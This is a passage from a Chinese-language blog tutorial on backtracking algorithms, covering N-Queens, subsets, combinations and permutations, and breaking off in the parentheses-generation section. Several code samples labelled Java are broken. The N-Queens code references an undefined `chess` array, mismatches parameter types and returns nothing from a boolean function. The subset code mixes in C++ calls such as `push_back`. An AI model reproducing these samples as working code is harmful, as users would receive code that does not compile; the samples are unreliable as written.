的时间复杂度。有更好的方法通过交换元素达到目的，但是难理解一些，这里就不写了，有兴趣可以自行搜索一下。</p><p>但是必须说明的是，不管怎么优化，都符合回溯框架，而且时间复杂度都不可能低于 O(N!)，因为穷举整棵决策树是无法避免的。<strong>这也是回溯算法的一个特点，不像动态规划存在重叠子问题可以优化，回溯算法就是纯暴力穷举，复杂度一般都很高</strong>。</p><p>明白了全排列问题，就可以直接套回溯算法框架了，下面简单看看 N 皇后问题。</p><h2 id="1-2-N-皇后问题"><a href="#1-2-N-皇后问题" class="headerlink" title="1.2 N 皇后问题"></a>1.2 N 皇后问题</h2><p>这个问题很经典了，简单解释一下：给你一个 N×N 的棋盘，让你放置 N 个皇后，使得它们不能互相攻击。</p><p>PS：皇后可以攻击同一行、同一列、左上左下右上右下四个方向    的任意单位。</p><p>这个问题本质上跟全排列问题差不多，决策树的每一层表示棋盘上的每一行；每个节点可以做出的选择是，在该行的任意一列放置一个皇后。</p><p>直接套用框架:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;List&lt;String&gt;&gt; res;<br><br><span class="hljs-comment">/* 输入棋盘边长 n，返回所有合法的放置 */</span><br><span class="hljs-keyword">public</span> List&lt;List&lt;String&gt;&gt; solveNQueens(<span class="hljs-keyword">int</span> n) &#123;<br>    <span class="hljs-keyword">char</span>[][] board = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[n][n];<br>    <span class="hljs-comment">// &#x27;.&#x27; 表示空，&#x27;Q&#x27; 表示皇后，初始化空棋盘。</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++)<br>            board[i][j] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>    List&lt;List&lt;String&gt;&gt; res = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>    backtrack(board, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> res<br>&#125;<br><br><span class="hljs-comment">// 路径：board 中小于 row 的那些行都已经成功放置了皇后</span><br><span class="hljs-comment">// 选择列表：第 row 行的所有列都是放置皇后的选择</span><br><span class="hljs-comment">// 结束条件：row 超过 board 的最后一行</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(List&lt;String&gt; board, <span class="hljs-keyword">int</span> row)</span> </span>&#123;<br>    <span class="hljs-comment">// 触发结束条件</span><br>    <span class="hljs-keyword">if</span> (row == board.length()) &#123;<br>res.add(construct(board));<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> col = <span class="hljs-number">0</span>; col &lt; board.length(); col++) &#123;<br>        <span class="hljs-keyword">if</span> (valid(board, row, col)) &#123;<br>            <span class="hljs-comment">//做选择</span><br>            chess[row][col] = <span class="hljs-string">&#x27;Q&#x27;</span>;<br>            <span class="hljs-comment">//进去下一决策</span><br>        backtrack(board, row + <span class="hljs-number">1</span>);<br>            <span class="hljs-comment">// 撤销选择</span><br>            board[row][col] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这部分主要代码，其实跟全排列问题差不多，<code>isValid</code> 函数的实现也很简单：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//row表示第几行，col表示第几列</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">valid</span><span class="hljs-params">(<span class="hljs-keyword">char</span>[][] board, <span class="hljs-keyword">int</span> row, <span class="hljs-keyword">int</span> col)</span> </span>&#123;<br>    <span class="hljs-comment">//判断当前列有没有皇后,因为他是一行一行往下走的，</span><br>    <span class="hljs-comment">//我们只需要检查走过的行数即可，通俗一点就是判断当前</span><br>    <span class="hljs-comment">//坐标位置的上面有没有皇后</span><br>    <br>    <span class="hljs-comment">// 检查列是否有皇后互相冲突</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; row; i++) &#123;<br>        <span class="hljs-keyword">if</span> (board[i][col] == <span class="hljs-string">&#x27;Q&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-comment">// 检查右上方是否有皇后互相冲突</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = row - <span class="hljs-number">1</span>, j = col + <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span> &amp;&amp; j &lt; board.length; i--, j++) &#123;<br>        <span class="hljs-keyword">if</span> (board[i][j] == <span class="hljs-string">&#x27;Q&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-comment">// 检查左上方是否有皇后互相冲突</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = row - <span class="hljs-number">1</span>, j = col - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span> &amp;&amp; j &gt;= <span class="hljs-number">0</span>; i--, j--) &#123;<br>        <span class="hljs-keyword">if</span> (board[i][j] == <span class="hljs-string">&#x27;Q&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>函数 <code>backtrack</code> 依然像个在决策树上游走的指针，通过 <code>row</code> 和 <code>col</code> 就可以表示函数遍历到的位置，通过 <code>isValid</code> 函数可以将不符合条件的情况剪枝：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/回溯7.jpg" alt="img" style="zoom:50%;" /></p><p>如果直接给你这么一大段解法代码，可能是懵逼的。但是现在明白了回溯算法的框架套路，还有啥难理解的呢？无非是改改做选择的方式，排除不合法选择的方式而已，只要框架存于心，你面对的只剩下小问题了。</p><p>当 <code>N = 8</code> 时，就是八皇后问题，数学大佬高斯穷尽一生都没有数清楚八皇后问题到底有几种可能的放置方法，但是我们的算法只需要一秒就可以算出来所有可能的结果。</p><p>不过真的不怪高斯。这个问题的复杂度确实非常高，看看我们的决策树，虽然有 <code>isValid</code> 函数剪枝，但是最坏时间复杂度仍然是 O(N^(N+1))，而且无法优化。如果 <code>N = 10</code> 的时候，计算就已经很耗时了。</p><p><strong>有的时候，我们并不想得到所有合法的答案，只想要一个答案，怎么办呢</strong>？比如解数独的算法，找所有解法复杂度太高，只要找到一种解法就可以。</p><p>其实特别简单，只要稍微修改一下回溯算法的代码即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 函数找到一个答案后就返回 true</span><br><span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(List&lt;String&gt; board, <span class="hljs-keyword">int</span> row)</span> </span>&#123;<br>    <span class="hljs-comment">// 触发结束条件</span><br>    <span class="hljs-keyword">if</span> (row == board.length()) &#123;<br>res.add(construct(board));<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    ...<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> col = <span class="hljs-number">0</span>; col &lt; n; col++) &#123;<br>        ...<br>        board[row][col] = <span class="hljs-string">&#x27;Q&#x27;</span>;<br><br>        <span class="hljs-keyword">if</span> (backtrack(board, row + <span class="hljs-number">1</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br><br>        board[row][col] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样修改后，只要找到一个答案，for 循环的后续递归穷举都会被阻断。也许你可以在 N 皇后问题的代码框架上，稍加修改，写一个解数独的算法？</p><h2 id="1-3-最后总结"><a href="#1-3-最后总结" class="headerlink" title="1.3 最后总结"></a>1.3 最后总结</h2><p>回溯算法就是个多叉树的遍历问题，关键就是在前序遍历和后序遍历的位置做一些操作，算法框架如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(路径, 选择列表)</span></span>&#123;<br>    <span class="hljs-keyword">for</span>(选择：选择列表)&#123;<br>        做选择<br>        backtrack(路径, 选择列表)<br>        撤销选择<br>    &#125;   <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>写 <code>backtrack</code> 函数时，需要维护走过的「路径」和当前可以做的「选择列表」，当触发「结束条件」时，将「路径」记入结果集</strong>。</p><p>其实想想看，回溯算法和动态规划是不是有点像呢？我们在动态规划系列文章中多次强调，动态规划的三个需要明确的点就是「状态」「选择」和「base case」，是不是就对应着走过的「路径」，当前的「选择列表」和「结束条件」？</p><p>某种程度上说，动态规划的暴力求解阶段就是回溯算法。只是有的问题具有重叠子问题性质，可以用 dp table 或者备忘录优化，将递归树大幅剪枝，这就变成了动态规划。而今天的两个问题，都没有重叠子问题，也就是回溯算法问题了，复杂度非常高是不可避免的。</p><h1 id="2-回溯解决子集，排列，组合问题"><a href="#2-回溯解决子集，排列，组合问题" class="headerlink" title="2. 回溯解决子集，排列，组合问题"></a>2. 回溯解决子集，排列，组合问题</h1><p>今天就来聊三道考察频率高，而且容易让人搞混的算法问题，分别是求子集（subset），求排列（permutation），求组合（combination）。这几个问题都可以用回溯算法解决。</p><h2 id="2-1-子集"><a href="#2-1-子集" class="headerlink" title="2.1 子集"></a>2.1 子集</h2><p>问题很简单，输入一个<strong>不包含重复数字</strong>的数组，要求算法输出这些数字的所有子集。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;List&lt;Integer&gt;&gt; subsets(List&lt;Integer&gt; nums);<br></code></pre></td></tr></table></figure><p>比如输入 <code>nums = [1,2,3]</code>，你的算法应输出 8 个子集，包含空集和本身，顺序可以不同：</p><p>[ [],[1],[2],[3],[1,3],[2,3],[1,2],[1,2,3] ]</p><p><strong>第一个解法是利用数学归纳的思想</strong>：假设我现在知道了规模更小的子问题的结果，如何推导出当前问题的结果呢？</p><p>具体来说就是，现在让你求 <code>[1,2,3]</code> 的子集，如果你知道了 <code>[1,2]</code> 的子集，是否可以推导出 <code>[1,2,3]</code> 的子集呢？先把  <code>[1,2]</code> 的子集写出来瞅瞅：</p><p>[ [],[1],[2],[1,2] ]</p><p>你会发现这样一个规律：</p><p>subset(<code>[1,2,3]</code>) - subset(<code>[1,2]</code>)= [3],[1,3],[2,3],[1,2,3]</p><p>而这个结果，就是把 sebset(<code>[1,2]</code>) 的结果中每个集合再添加上 3。</p><p>换句话说，如果 <code>A = subset([1,2])</code> ，那么：</p><p>subset(<code>[1,2,3]</code>)= A + [A[i].add(3) for i = 1..len(A)]</p><p>这就是一个典型的递归结构嘛，<code>[1,2,3]</code> 的子集可以由 <code>[1,2]</code> 追加得出，<code>[1,2]</code> 的子集可以由 <code>[1]</code> 追加得出，base case 显然就是当输入集合为空集时，输出子集也就是一个空集。</p><p>翻译成代码就很容易理解了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;List&lt;Integer&gt;&gt; subsets(List&lt;Integer&gt; nums); &#123;<br>    <span class="hljs-comment">// base case，返回一个空集</span><br>    <span class="hljs-keyword">if</span> (nums.isEmpty()) <span class="hljs-keyword">return</span> &#123;&#123;&#125;&#125;;<br>    <span class="hljs-comment">// 把最后一个元素拿出来</span><br>    <span class="hljs-keyword">int</span> n = nums.back();<br>    nums.pop_back();<br>    <span class="hljs-comment">// 先递归算出前面元素的所有子集</span><br>    List&lt;List&lt;Integer&gt;&gt; res = subsets(nums);<br><br>    <span class="hljs-keyword">int</span> size = res.size();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++) &#123;<br>        <span class="hljs-comment">// 然后在之前的结果之上追加</span><br>        res.push_back(res[i]);<br>        res.back().push_back(n);<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>这个问题的时间复杂度计算比较容易坑人</strong>。我们之前说的计算递归算法时间复杂度的方法，是找到递归深度，然后乘以每次递归中迭代的次数。对于这个问题，递归深度显然是 N，但我们发现每次递归 for 循环的迭代次数取决于 <code>res</code> 的长度，并不是固定的。</p><p>根据刚才的思路，<code>res</code> 的长度应该是每次递归都翻倍，所以说总的迭代次数应该是 2^N。或者不用这么麻烦，你想想一个大小为 N 的集合的子集总共有几个？2^N 个对吧，所以说至少要对 <code>res</code> 添加 2^N 次元素。</p><p>那么算法的时间复杂度就是 O(2^N) 吗？还是不对，2^N 个子集是 <code>push_back</code>添加进 <code>res</code> 的，所以要考虑 <code>push_back</code> 这个操作的效率：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;List&lt;Integer&gt;&gt; res = ...<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++) &#123;<br>    res.push_back(res[i]); <span class="hljs-comment">// O(N)</span><br>    res.back().push_back(n); <span class="hljs-comment">// O(1)</span><br>&#125;<br></code></pre></td></tr></table></figure><p>因为 <code>res[i]</code> 也是一个数组呀，<code>push_back</code> 是把 <code>res[i]</code> copy 一份然后添加到数组的最后，所以一次操作的时间是 O(N)。</p><p>综上，总的时间复杂度就是 O(N*2^N)，还是比较耗时的。</p><p>空间复杂度的话，如果不计算储存返回结果所用的空间的，只需要 O(N) 的递归堆栈空间。如果计算 <code>res</code> 所需的空间，应该是 O(N*2^N)。</p><p><strong>第二种通用方法就是回溯算法</strong>。旧文「回溯算法详解」写过回溯算法的模板：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(路径, 选择列表)</span></span>&#123;<br>    <span class="hljs-keyword">for</span>(选择：选择列表)&#123;<br>        做选择<br>        backtrack(路径, 选择列表)<br>        撤销选择<br>    &#125;   <br>&#125;<br></code></pre></td></tr></table></figure><p>只要改造回溯算法的模板就行了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;List&lt;Integer&gt;&gt; res = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br><br>List&lt;List&lt;Integer&gt;&gt; subsets(<span class="hljs-keyword">int</span>[] nums) &#123;<br>    <span class="hljs-comment">// 记录走过的路径</span><br>    LinkedList&lt;Integer&gt; track = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>    backtrack(nums, <span class="hljs-number">0</span>, track);<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> start, LinkedList&lt;Integer&gt; track)</span> </span>&#123;<br>    res.add(<span class="hljs-keyword">new</span> LinkedList(track));<br>    <span class="hljs-comment">// 注意 i 从 start 开始递增</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = start; i &lt; nums.length(); i++) &#123;<br>        <span class="hljs-comment">// 做选择</span><br>        track.add(nums[i]);<br>        <span class="hljs-comment">// 回溯</span><br>        backtrack(nums, i + <span class="hljs-number">1</span>, track);<br>        <span class="hljs-comment">// 撤销选择</span><br>        track.removeLast();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看见，对 <code>res</code> 的更新是一个<strong>前序遍历</strong>，也就是说，<code>res</code> 就是树上的所有节点：</p><p><img src="F:\QQPCmgr\Desktop\回溯子集.jpg" alt="图片" style="zoom:50%;" /></p><h2 id="2-2-组合"><a href="#2-2-组合" class="headerlink" title="2.2 组合"></a>2.2 组合</h2><p>输入两个数字 <code>n, k</code>，算法输出 <code>[1..n]</code> 中 k 个数字的所有组合。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&gt; combine(<span class="hljs-keyword">int</span> n, <span class="hljs-keyword">int</span> k);<br></code></pre></td></tr></table></figure><p>比如输入 <code>n = 4, k = 2</code>，输出如下结果，顺序无所谓，但是不能包含重复（按照组合的定义，<code>[1,2]</code> 和 <code>[2,1]</code> 也算重复）：</p><p>[<br> [1,2],<br> [1,3],<br> [1,4],<br> [2,3],<br> [2,4],<br> [3,4]<br>]</p><p>这就是典型的回溯算法，<code>k</code> 限制了树的高度，<code>n</code> 限制了树的宽度，直接套我们以前讲过的回溯算法模板框架就行了：</p><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_jpg/gibkIz0MVqdH2utsM2MG2UwDrfnfibkic701mPiaqZwiamztNdfCwz2oicLgxOfvsAF5lIXPDFOvo4cxvDPfRVf5ETxg/640?wx_fmt=jpeg&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片" style="zoom:50%;" /></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">vector</span>&lt;<span class="hljs-keyword">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&gt;res;<br><br><span class="hljs-keyword">vector</span>&lt;<span class="hljs-keyword">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&gt; combine(<span class="hljs-keyword">int</span> n, <span class="hljs-keyword">int</span> k) &#123;<br>    <span class="hljs-keyword">if</span> (k &lt;= <span class="hljs-number">0</span> || n &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> res;<br>    <span class="hljs-keyword">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-keyword">track</span>;<br>    backtrack(n, k, <span class="hljs-number">1</span>, <span class="hljs-keyword">track</span>);<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br>void backtrack(<span class="hljs-keyword">int</span> n, <span class="hljs-keyword">int</span> k, <span class="hljs-keyword">int</span> start, <span class="hljs-keyword">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&amp; <span class="hljs-keyword">track</span>) &#123;<br>    <span class="hljs-comment">// 到达树的底部</span><br>    <span class="hljs-keyword">if</span> (k == <span class="hljs-keyword">track</span>.<span class="hljs-keyword">size</span>()) &#123;<br>        res.push_back(<span class="hljs-keyword">track</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// 注意 i 从 start 开始递增</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = start; i &lt;= n; i++) &#123;<br>        <span class="hljs-comment">// 做选择</span><br>        <span class="hljs-keyword">track</span>.push_back(i);<br>        backtrack(n, k, i + <span class="hljs-number">1</span>, <span class="hljs-keyword">track</span>);<br>        <span class="hljs-comment">// 撤销选择</span><br>        <span class="hljs-keyword">track</span>.pop_back();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>backtrack</code> 函数和计算子集的差不多，<strong>区别在于，更新 <code>res</code> 的地方是树的底端</strong>。</p><h2 id="2-3-排列"><a href="#2-3-排列" class="headerlink" title="2.3 排列"></a>2.3 排列</h2><p>输入一个不包含重复数字的数组 <code>nums</code>，返回这些数字的全部排列。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;List&lt;Integer&gt;&gt; permute(<span class="hljs-keyword">int</span>[] nums);<br></code></pre></td></tr></table></figure><p>比如说输入数组 <code>[1,2,3]</code>，输出结果应该如下，顺序无所谓，不能有重复：</p><p>[<br> [1,2,3],<br> [1,3,2],<br> [2,1,3],<br> [2,3,1],<br> [3,1,2],<br> [3,2,1]<br>]</p><p><a href="http://mp.weixin.qq.com/s?__biz=MzAxODQxMDM0Mw==&amp;mid=2247484709&amp;idx=1&amp;sn=1c24a5c41a5a255000532e83f38f2ce4&amp;chksm=9bd7fb2daca0723be888b30345e2c5e64649fc31a00b05c27a0843f349e2dd9363338d0dac61&amp;scene=21#wechat_redirect">回溯算法详解</a> 中就是拿这个问题来解释回溯模板的。这里又列出这个问题，是将「排列」和「组合」这两个回溯算法的代码拿出来对比。</p><p>首先画出回溯树来看一看：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/回溯树.jpg" alt="图片" style="zoom:50%;" /></p><p>我们当时使用 Java 代码写的解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;List&lt;Integer&gt;&gt; res = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br><br><span class="hljs-comment">/* 主函数，输入一组不重复的数字，返回它们的全排列 */</span><br>List&lt;List&lt;Integer&gt;&gt; permute(<span class="hljs-keyword">int</span>[] nums) &#123;<br>    <span class="hljs-comment">// 记录「路径」</span><br>    LinkedList&lt;Integer&gt; track = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>    backtrack(nums, track);<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, LinkedList&lt;Integer&gt; track)</span> </span>&#123;<br>    <span class="hljs-comment">// 触发结束条件</span><br>    <span class="hljs-keyword">if</span> (track.size() == nums.length) &#123;<br>        res.add(<span class="hljs-keyword">new</span> LinkedList(track));<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.length; i++) &#123;<br>        <span class="hljs-comment">// 排除不合法的选择</span><br>        <span class="hljs-keyword">if</span> (track.contains(nums[i]))<br>            <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-comment">// 做选择</span><br>        track.add(nums[i]);<br>        <span class="hljs-comment">// 进入下一层决策树</span><br>        backtrack(nums, track);<br>        <span class="hljs-comment">// 取消选择</span><br>        track.removeLast();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>回溯模板依然没有变，但是根据排列问题和组合问题画出的树来看，排列问题的树比较对称，而组合问题的树越靠右节点越少。</p><p>在代码中的体现就是，排列问题每次通过 <code>contains</code> 方法来排除在 <code>track</code> 中已经选择过的数字；而组合问题通过传入一个 <code>start</code> 参数，来排除 <code>start</code> 索引之前的数字。</p><p><strong>以上，就是排列组合和子集三个问题的解法，总结一下</strong>：</p><p>子集问题可以利用数学归纳思想，假设已知一个规模较小的问题的结果，思考如何推导出原问题的结果。也可以用回溯算法，要用 <code>start</code> 参数排除已选择的数字。</p><p>组合问题利用的是回溯思想，结果可以表示成树结构，我们只要套用回溯算法模板即可，关键点在于要用一个 <code>start</code> 排除已经选择过的数字。</p><p>排列问题是回溯思想，也可以表示成树结构套用算法模板，不同之处在于使用<code>contains</code> 方法排除已经选择的数字，前文有详细分析，这里主要是和组合问题作对比。</p><p>对于这三个问题，关键区别在于回溯树的结构，不妨多观察递归树的结构，很自然就可以理解代码的含义了。</p><h1 id="3-括号生成"><a href="#3-括号生成" class="headerlink" title="3. 括号生成"></a>3. 括号生成</h1><p>括号问题可以简单分成两类，一类是前文写过的 <a href="https://labuladong.gitee.io/algo/高频面试系列/合法括号判定.html">括号的合法性判断</a> ，一类是合法括号的生成。对于括号合法性的判断，主要是借助「栈」这种数据结构，而对于括号的生成，一般都要利用回溯递归的思想。</p><p>关于回溯算法，我们前文写过一篇 <a href="https://labuladong.gitee.io/algo/算法思维系列/回溯算法详解修订版.html">回溯算法套路框架详解</a> 反响非常好，读本文前应该读过那篇文章，这样你就能够进一步了解回溯算法的框架使用方法了。</p><p>回到正题，括号生成算法是 LeetCode 第 22 题，要求如下：</p><p>请你写一个算法，输入是一个正整数 <code>n</code>，输出是 <code>n</code> 对括号的所有合法组合，函数签名如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title">generateParenthesis</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span><br></code></pre></td></tr></table></figure><p>比如说，输入 <code>n=3</code>，输出为如下 5 个字符串：</p><p>“((()))”, “(()())”, “(())()”, “()(())”, “()()()”</p><p>有关括号问题，你只要记住以下性质，思路就很容易想出来：</p><p><strong>1、一个「合法」括号组合的左括号数量一定等于右括号数量，这个很好理解</strong>。</p><p><strong>2、对于一个「合法」的括号字符串组合 <code>p</code>，必然对于任何 <code>0 &lt;= i &lt; len(p)</code> 都有：子串 <code>p[0..i]</code> 